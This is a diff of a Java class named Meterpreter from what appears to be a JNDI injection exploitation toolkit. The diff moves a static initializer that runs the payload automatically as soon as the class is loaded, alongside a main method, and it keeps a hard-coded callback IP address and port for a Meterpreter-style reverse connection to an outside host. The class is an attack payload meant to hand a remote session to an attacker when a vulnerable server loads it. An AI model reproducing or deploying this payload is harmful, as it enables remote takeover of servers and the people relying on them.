@@ -3,26 +3,31 @@
  */
 package com.qi4l.jndi.template.echo;
 
-import java.io.*;
+import java.io.DataInputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
 import java.net.Socket;
 import java.util.HashMap;
 
 public class Meterpreter
         extends ClassLoader
         implements Runnable {
-    private                HashMap parameterMap;
-    public static String host = "111.229.10.212";
-    public static String port = "23412";
+    public static          String  host = "111.229.10.212";
+    public static          String  port = "23412";
     //public                 String  host;
     //public                 String  port;
     static /* synthetic */ Class   class$0;
     static /* synthetic */ Class   class$1;
     static /* synthetic */ Class   class$2;
 
-    public void initLhost() {
-        this.host = "111.229.10.212";
-        this.port = "23412";
+    static {
+
+        Meterpreter meterpreter = new Meterpreter();
+        meterpreter.initLhost();
+        meterpreter.run();
     }
+
+    private                HashMap parameterMap;
 
 
     //public String toString() {
@@ -36,6 +41,16 @@ public class Meterpreter
     //    this.parameterMap = null;
     //    return "";
     //}
+
+    public static void main(String[] args) throws Exception {
+        Meterpreter meterpreter = new Meterpreter();
+        meterpreter.run();
+    }
+
+    public void initLhost() {
+        this.host = "111.229.10.212";
+        this.port = "23412";
+    }
 
     public boolean equals(Object paramObject) {
         try {
@@ -106,18 +121,6 @@ public class Meterpreter
         } catch (Throwable throwable) {
             // empty catch block
         }
-    }
-
-    public static void main(String[] args) throws Exception {
-        Meterpreter meterpreter = new Meterpreter();
-        meterpreter.run();
-    }
-
-    static {
-
-        Meterpreter meterpreter = new Meterpreter();
-        meterpreter.initLhost();
-        meterpreter.run();
     }
 
     public void run() {
